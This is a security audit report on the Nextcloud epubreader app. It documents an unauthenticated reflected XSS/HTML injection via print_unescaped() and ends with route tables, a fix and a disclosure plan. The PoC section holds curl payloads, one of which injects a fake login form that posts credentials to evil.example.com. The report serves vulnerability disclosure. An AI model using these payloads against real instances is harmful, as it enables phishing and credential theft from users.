# Security Audit Report: Nextcloud epubreader App

**App ID:** `epubreader`
**Version:** 1.4.7
**Source:** https://github.com/e-alfred/epubreader
**Last PHP code change:** 2021-08-04 (5+ years stale)
**Nextcloud compatibility:** 21–23
**License:** AGPL-3.0
**Audit date:** 2026-11-18

---

## Finding 1: Reflected XSS / HTML Injection via `print_unescaped()` on `@PublicPage` Endpoint

### Vulnerability Type
- **CWE-79**: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
- **CVSS 3.1 estimate**: 6.1 (Medium) — `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
  (CSP mitigates full XSS to HTML injection; without CSP, this would be High)

### Affected Route
```
GET /apps/epubreader/
```

### Controller Method
`PageController::showReader()` — `lib/Controller/PageController.php:76`

### Annotations / Privilege Required
```php
/**
 * @PublicPage         ← NO authentication required
 * @NoCSRFRequired     ← No CSRF token check
 */
```
**Privilege:** Unauthenticated (any internet user can reach this endpoint)

### Root Cause

In `PageController::showReader()` (line 90, 97):
```php
$fileInfo = $this->getFileInfo($this->request->get['file']);  // line 90
// ...
$params = [
    'downloadLink' => $this->request->get['file'],            // line 97 — raw user input
    // ...
];
$response = new TemplateResponse($this->appName, $template, $params, 'blank');
```

The `file` query parameter is passed directly into the template as `downloadLink` without any sanitization.

In all three templates (`templates/epubreader.php:31`, `templates/cbreader.php:31`, `templates/pdfreader.php:31`):
```php
<head class="session" ... data-downloadlink='<?php print_unescaped($downloadLink);?>' ...>
```

`print_unescaped()` outputs the value with **zero HTML encoding**, allowing an attacker to break out of the single-quoted HTML attribute and inject arbitrary HTML attributes or elements.

### Input → Sink Flow
```
HTTP GET ?file=PAYLOAD        (user-controlled)
  → $this->request->get['file']
  → $params['downloadLink']       (no sanitization)
  → TemplateResponse
  → print_unescaped($downloadLink)  (SINK — no escaping)
  → <head data-downloadlink='PAYLOAD'>  (rendered in HTML)
```

### Precondition for Template Rendering

For the template to render (and the XSS to fire), `getFileInfo()` must resolve the `file` parameter to a valid file. This succeeds when the `file` parameter contains a valid **public share token** (`/s/TOKEN/download...`), because the method extracts the token via regex and resolves the shared file.

Since public shares are, by definition, publicly accessible, the attacker only needs to know any valid share token on the target instance (or create one if they have an account).

### PoC Request

**Prerequisites:** A file shared via public link (share token: `TOKEN123`).

```bash
# Attribute injection (inject onmouseover event handler on <head>)
curl -s 'https://TARGET/apps/epubreader/?type=application/pdf&file=/s/TOKEN123/download%27%20onmouseover=%27alert(document.domain)%27%20x=%27'

# HTML content injection — phishing form (no authentication required)
curl -s 'https://TARGET/apps/epubreader/?type=application/pdf&file=/s/TOKEN123/download%27%3E%3C/head%3E%3Cbody%20style=%27background:white%27%3E%3Ch1%3ESession%20Expired%3C/h1%3E%3Cform%20action=%27https://evil.example.com/steal%27%3E%3Cinput%20name=%27user%27%20placeholder=%27Username%27%3E%3Cinput%20name=%27pass%27%20type=%27password%27%20placeholder=%27Password%27%3E%3Cbutton%3ELog%20in%3C/button%3E%3C/form%3E%3Cp%20id=%27'
```

### Dynamic Verification

Tested on local Nextcloud 23.0.12 with epubreader 1.4.7 installed. Verified with Playwright (headless Chromium):

1. **HTML attribute injection confirmed:** `onmouseover='alert(document.domain)'` injected as a parsed HTML attribute on the `<head>` element.
2. **HTML content injection confirmed:** A fake "Session Expired" login form was rendered and visible in the browser.
3. **CSP blocks inline JS execution:** Nextcloud's CSP (`script-src 'self'`) prevents inline event handlers from executing JavaScript. However:
   - `style-src 'self' blob: 'unsafe-inline'` allows CSS injection for UI manipulation
   - Full HTML injection enables phishing overlays, page defacement, and UI spoofing
   - `form-action 'self'` restricts external form submission but same-origin submission works
   - If CSP is relaxed (custom config, proxy stripping headers), full XSS is achievable

### Impact

- **Phishing:** An attacker can craft a URL that, when visited, renders a convincing fake login form under the legitimate Nextcloud domain. No authentication is required to generate or visit the malicious link.
- **UI spoofing:** Arbitrary HTML can be injected into the page, allowing page defacement.
- **CSS-based attacks:** Since `style-src` includes `'unsafe-inline'`, injected CSS can alter the page appearance, hide elements, or overlay fake content.
- **If CSP is absent/relaxed:** Full reflected XSS with JavaScript execution (cookie theft, session hijack, account takeover).

### Suggested Fix

Replace `print_unescaped($downloadLink)` with `p($downloadLink)` in all three templates, or escape at the controller level:

```php
// In PageController::showReader(), line 97:
'downloadLink' => htmlspecialchars($this->request->get['file'], ENT_QUOTES, 'UTF-8'),
```

Or in templates (preferred — defense in depth):
```php
// Replace:  print_unescaped($downloadLink)
// With:     p($downloadLink)
```

### Novelty Check

- No CVE exists for this app/endpoint/parameter
- No security advisory exists on GitHub (e-alfred/epubreader)
- No entry in Nextcloud security advisories (nextcloud/security-advisories)
- Searched: NVD, GHSA, HackerOne Nextcloud program, GitHub issues

---

## Route → Controller → Annotation Map

| # | Route | Verb | Controller::Method | Annotations | Privilege |
|---|-------|------|--------------------|-------------|-----------|
| 1 | `/` | GET | `PageController::showReader` | `@PublicPage @NoCSRFRequired` | Unauthenticated |
| 2 | `/bookmark/cursor/{fileId}` | GET | `BookmarkController::getCursor` | `@NoAdminRequired @NoCSRFRequired` | Any user |
| 3 | `/bookmark/cursor` | POST | `BookmarkController::setCursor` | `@NoAdminRequired @NoCSRFRequired` | Any user |
| 4 | `/bookmark/cursor/{fileId}` | DELETE | `BookmarkController::deleteCursor` | `@NoAdminRequired @NoCSRFRequired` | Any user |
| 5 | `/bookmark/{fileId}/{name}` | GET | `BookmarkController::get` | `@NoAdminRequired @NoCSRFRequired` | Any user |
| 6 | `/bookmark/{fileId}/{type}/{name}` | GET | `BookmarkController::get` | `@NoAdminRequired @NoCSRFRequired` | Any user |
| 7 | `/bookmark` | POST | `BookmarkController::set` | `@NoAdminRequired @NoCSRFRequired` | Any user |
| 8 | `/bookmark/{fileId}/{name}` | DELETE | `BookmarkController::delete` | `@NoAdminRequired @NoCSRFRequired` | Any user |
| 9 | `/metadata/{fileId}/{name}` | GET | `MetadataController::get` | `@NoAdminRequired @NoCSRFRequired` | Any user |
| 10 | `/metadata/{fileId}/{name}/{value}` | POST | `MetadataController::set` | `@NoAdminRequired` | Any user (CSRF checked) |
| 11 | `/preference/default/{scope}/{name}` | GET | `PreferenceController::getDefault` | `@NoAdminRequired @NoCSRFRequired` | Any user |
| 12 | `/preference/default` | POST | `PreferenceController::setDefault` | `@NoAdminRequired @NoCSRFRequired` | Any user |
| 13 | `/preference/default/{scope}/{name}` | DELETE | `PreferenceController::deleteDefault` | _(none)_ | Admin only + CSRF |
| 14 | `/preference/{fileId}/{scope}/{name}` | GET | `PreferenceController::get` | `@NoAdminRequired @NoCSRFRequired` | Any user |
| 15 | `/preference` | POST | `PreferenceController::set` | `@NoAdminRequired @NoCSRFRequired` | Any user |
| 16 | `/preference/{fileId}/{scope}/{name}` | DELETE | `PreferenceController::delete` | _(none)_ | Admin only + CSRF |

---

## Per-Endpoint Coverage Matrix

| Endpoint | IDOR/BAC | SQLi | XSS | SSRF | Path Trav | CSRF | Deser | XXE | CmdInj | Open Redir |
|----------|----------|------|-----|------|-----------|------|-------|-----|--------|------------|
| showReader | Safe (file resolved via NC API) | N/A | **VULN** | N/A | Safe (NC Folder API) | N/A (@PublicPage) | Safe | N/A | N/A | N/A |
| bookmark#getCursor | Safe (userId filtered in SQL) | Safe (parameterized) | Safe (JSON response) | N/A | N/A | N/A (GET) | Safe | N/A | N/A | N/A |
| bookmark#setCursor | Safe (userId in insert) | Safe (parameterized) | Safe (JSON) | N/A | N/A | Low (POST+@NoCSRFRequired) | Safe | N/A | N/A | N/A |
| bookmark#set | Safe (userId in insert) | Safe (parameterized) | Safe (JSON) | N/A | N/A | Low (POST+@NoCSRFRequired) | Safe | N/A | N/A | N/A |
| bookmark#get | Safe (userId filtered) | Safe (parameterized) | Safe (JSON) | N/A | N/A | N/A (GET) | Safe | N/A | N/A | N/A |
| bookmark#delete | Safe (userId filtered) | Safe (parameterized) | N/A | N/A | N/A | N/A (DELETE) | Safe | N/A | N/A | N/A |
| bookmark#deleteCursor | Safe (userId filtered) | Safe (parameterized) | N/A | N/A | N/A | N/A (DELETE) | Safe | N/A | N/A | N/A |
| metadata#get | Safe* | N/A (no SQL) | Safe (JSON) | N/A | N/A | N/A (GET) | Safe | N/A | N/A | N/A |
| metadata#set | N/A (no-op) | N/A | N/A | N/A | N/A | Safe (CSRF checked) | Safe | N/A | N/A | N/A |
| preference#getDefault | Safe (userId filtered) | Safe (parameterized) | Safe (JSON) | N/A | N/A | N/A (GET) | Safe | N/A | N/A | N/A |
| preference#setDefault | Safe (userId in insert) | Safe (parameterized) | Safe (JSON) | N/A | N/A | Low (POST+@NoCSRFRequired) | Safe | N/A | N/A | N/A |
| preference#deleteDefault | Safe (admin-only) | Safe | N/A | N/A | N/A | Safe (CSRF checked) | Safe | N/A | N/A | N/A |
| preference#get | Safe (userId filtered) | Safe (parameterized) | Safe (JSON) | N/A | N/A | N/A (GET) | Safe | N/A | N/A | N/A |
| preference#set | Safe (userId in insert) | Safe (parameterized) | Safe (JSON) | N/A | N/A | Low (POST+@NoCSRFRequired) | Safe | N/A | N/A | N/A |
| preference#delete | Safe (admin-only) | Safe | N/A | N/A | N/A | Safe (CSRF checked) | Safe | N/A | N/A | N/A |

**Legend:** VULN = confirmed vulnerability, Safe = verified safe, Low = code smell but limited impact, N/A = not applicable

**Notes:**
- *metadata#get: No user ownership check, but data comes from optional `files_opds` app and is file-level metadata (title/author), not user-private data.
- POST endpoints with `@NoCSRFRequired` are "Low" because: (a) they only write user-scoped data (bookmarks/preferences), (b) the data written has no security-sensitive effect, and (c) POST via CSRF requires the attacker to know a valid fileId.
- No `unserialize()`, XML parsing, shell execution, or HTTP client calls found in the codebase.
- All SQL queries use parameterized statements (`?` placeholders with bound parameters).
- All bookmark/preference DB operations filter by injected `$this->userId`.

---

## Disclosure

This finding should be reported to:
1. **App maintainer:** https://github.com/e-alfred/epubreader — via GitHub Security Advisory (private)
2. **Nextcloud security team:** security@nextcloud.com (for app store coordination)

Recommended timeline: 90-day coordinated disclosure.
